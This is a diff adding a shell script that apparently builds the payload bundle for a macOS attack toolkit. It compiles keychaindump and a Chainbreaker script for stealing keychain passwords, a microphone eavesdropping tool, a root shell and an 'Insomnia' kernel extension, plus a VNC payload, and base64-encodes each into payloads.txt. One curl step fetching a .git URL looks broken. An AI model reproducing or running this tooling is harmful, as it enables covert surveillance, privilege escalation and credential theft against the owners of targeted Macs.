@@ -1,0 +1,75 @@
+echo 'Generating payloads!'
+
+base64 vnc > payloads.txt
+if [ $? -eq 0 ]
+then
+	echo -e '\033[93mCreated VNC payload.\033[0m'
+else
+	echo -e '\033[91mError creating VNC payload.\033[0m'
+	echo 'NONE' > payloads.txt
+fi
+
+curl https://raw.githubusercontent.com/juuso/keychaindump.git
+cd keychaindump
+gcc keychaindump.c -o keychaindump -lcrypto
+cd ..
+base64 keychaindump/keychaindump >> payloads.txt
+if [ $? -eq 0 ]
+then
+	echo -e '\033[93mCreated keychaindump payload.\033[0m'
+else
+	echo -e '\033[91mError creating keychaindump payload.\033[0m'
+	echo 'NONE' >> payloads.txt
+fi
+
+git clone https://github.com/richardkiss/speakerpipe-osx.git
+cd speakerpipe-osx
+make
+cp speakerpipe ../
+cd ..
+base64 speakerpipe-osx/mikepipe >> payloads.txt
+if [ $? -eq 0 ]
+then
+	echo -e '\033[93mCreated microphone payload.\033[0m'
+else
+	echo -e '\033[91mError creating microphone payload.\033[0m'
+	echo 'NONE' >> payloads.txt
+fi
+gcc UID.c -o rootshell
+base64 rootshell >> payloads.txt
+if [ $? -eq 0 ]
+then
+	echo -e '\033[93mCreated rootshell payload.\033[0m'
+else
+	echo -e '\033[91mError creating rootshell payload.\033[0m'
+	echo 'NONE' >> payloads.txt
+fi
+zip -r Insomnia.zip Insomnia.kext
+base64 Insomnia.zip >> payloads.txt
+if [ $? -eq 0 ]
+then
+	echo -e '\033[93mCreated Insomnia payload.\033[0m'
+else
+	echo -e '\033[91mError creating Insomnia payload.\033[0m'
+	echo 'NONE' >> payloads.txt
+fi
+
+base64 lock_icon.png  >> payloads.txt
+if [ $? -eq 0 ]
+then
+	echo -e '\033[93mCreated Lock Icon payload.\033[0m'
+else
+	echo -e '\033[91mError creating Lock Icon payload.\033[0m'
+	echo 'NONE' >> payloads.txt
+fi
+
+base64 smallbreaker.py >> payloads.txt
+if [ $? -eq 0 ]
+then
+	echo -e '\033[93mCreated Chainbreaker payload.\033[0m'
+else
+	echo -e '\033[91mError creating Chainbreaker payload.\033[0m'
+	echo 'NONE' >> payloads.txt
+fi
+
+echo 'Done!'
